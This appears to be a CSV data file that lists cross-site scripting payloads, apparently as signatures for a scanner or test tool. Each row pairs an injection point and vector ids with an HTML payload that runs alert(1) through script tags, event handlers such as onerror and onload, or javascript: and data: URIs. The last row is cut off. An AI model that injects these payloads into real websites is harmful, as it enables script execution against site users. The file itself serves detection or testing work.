eval_place,sig_vector,sig_string
body_tag,"[0, 1, 2]","""<script>alert(1)</script>"""
body_tag,[3],"""<img src='x' onerror='alert(1);'>"""
body_tag,[4],"""<body onload='alert(1)'>"""
body_tag,[5],"""<svg onload='alert(1)'>"""
body_tag,[6],"""<input type='text' value='' onfocus='alert(1)' autofocus>"""
body_tag,[7],"""<details open='' ontoggle='alert(1)'>"""
body_tag,"[8, 9]","""<video><source onerror='alert(1)'>"""
body_tag,[10],"""<audio src='x' onerror='alert(1)'>"""
body_tag,[11],"""<frame src='javascript:alert(1)'>"""
body_tag,"[12, 1, 2]","""<iframe src='data:text/html,<script>alert(1)</script>'>"""
body_tag,"[13, 14]","""<a href='javascript:alert(1)'>link</a>"""
body_tag,[15],"""<style>@keyframes x"
